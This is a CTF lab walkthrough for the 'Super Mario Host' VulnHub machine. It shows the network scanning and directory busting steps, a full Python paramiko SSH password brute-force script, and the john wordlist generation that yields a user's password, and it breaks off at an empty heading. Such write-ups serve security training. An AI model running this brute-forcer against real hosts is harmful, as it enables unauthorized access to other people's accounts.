# Super Mario Host: 1.0.1

* [Download](https://www.vulnhub.com/entry/super-mario-host-101,186/)
* Author: mr_h4sh

### Level

Intermediate.

***

## Overview

In this fun Super Mario Bros themed CTF, there are 2 flags and the goal is to get the password for every user on the system.

Author mr_h4sh gives us a hint from the description: `remember that Enumeration is the key.`

***

# Enumeration

As per the hint, I hopped on my Kali box and immediately fired up `netdiscover`

Running it gave me this:
```
root@kali:~# netdiscover

 Currently scanning: 192.168.89.0/16   |   Screen View: Unique Hosts                                    
                                                                                                        
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                        
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.74.2    00:50:56:fe:c3:07      1      60  Unknown vendor                                       
 192.168.74.128  00:0c:29:ee:57:97      1      60  Unknown vendor
 ```
 
I knew that `192.168.74.128` is the target VM because the other address is my router and the address of the Kali box is `192.168.74.129`

With the target IP, I used nmap to find open ports on the target. Nmap gave me this output:

```
root@kali:~# nmap -sV 192.168.74.128

Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-25 05:38 EDT
Nmap scan report for mario.supermariohost.local (192.168.74.128)
Host is up (0.000051s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8180/tcp open  http    Apache httpd
MAC Address: 00:0C:29:EE:57:97 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds
```

Hm. The SSH port looks interesting, but we'll focus on the http service first.

I visit `192.168.74.128:8180` and it gives me the default nginx webpage
![alt-text](http://i.imgur.com/StZcUWc.png)

**Next, we do some dirbusting on the server**

Using the `raft-small-directories.txt` file from SecLists and using whatever dirbusting program you like (i used `dirb`), we get the following results:

```
/server-status
/vhosts
```

We are unable to visit the `/server-status` file, but we can view the `/vhosts` file.

![alt-text](http://i.imgur.com/E1YM3xZ.png)

Add **mario.supermariohost.local** to your `/etc/hosts` file then visit mario.supermariohost.local:8180 in your browser.

A cool (but not really functioning) mario game comes up, awesome!

Following along with the Mario Bros theme, could there be other files named after other characters?

I tried `bowser.php`, `peach.php`, and, `luigi.php`. On `luigi.php`, there is just a message that adds some depth to the ctf, but not any info.

After no luck on the http side of things, I moved over to the SSH service.

***

After a few SSH attempts, I get blocked out of the box. That means that there's some sort of protection in place.

Using a great script from gknsb, I was able to get the ssh password of the user `luigi`

Here is the script:

```python
import paramiko, sys, os, socket, multiprocessing

global host, username, line, input_file
line = '\n--------------------------------------------------\n'
try:
    input_file = 'listname'  # The password wordlist
    host = 'ff80::23c:292f:fe63:7134%eth1'  # Example ipv6 host
    username = 'luigi'
    threads = 10
    if os.path.exists(input_file) == False:
        print '\n[*] File Path Does Not Exist!'
        sys.exit(4)
except KeyboardInterrupt:
    print '\n\n[*] User Requested An Interrupt'
    sys.exit(3)


def ssh_connect(password, event, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error, e:
        code = 2
    ssh.close()
    if code == 0:
        print('%s[*] User: %s [*] Pass Found: %s%s' % (line, username, password, line))
        event.set()
        sys.exit(0)
    elif code == 1:
        print('[*] User: %s [*] Pass: %s => Login Incorrect! <=' % (username,password))
    elif code == 2:
        print('[*] Connection Could Not Be Established To Address: %s' % (host))
        sys.exit(2)
    pass


print ''
with open(input_file) as file:
    passwords = file.readlines()
passwords = [x.strip('\n') for x in passwords]
pool = multiprocessing.Pool(threads)
m = multiprocessing.Manager()
event = m.Event()
for password in passwords:
    pool.apply_async(ssh_connect, (password, event))
pool.close()
event.wait()
pool.terminate()
```

With this script, we get the results:
```
--------------------------------------------------
[*] User: luigi [*] Pass Found: luigi1
--------------------------------------------------
```

Using the character names, you can generate a quick password list with `john`

```
root@kali:~/ctfs/supermario# cat testlist
mario
luigi
peach
root@kali:~/ctfs/supermario# john --wordlist:testlist --rules --stdout > mariolist
Press 'q' or Ctrl-C to abort, almost any other key for status
153p 0:00:00:00 100.00% (2017-04-22 13:09) 1700p/s Peaching
```

***

## Looking around








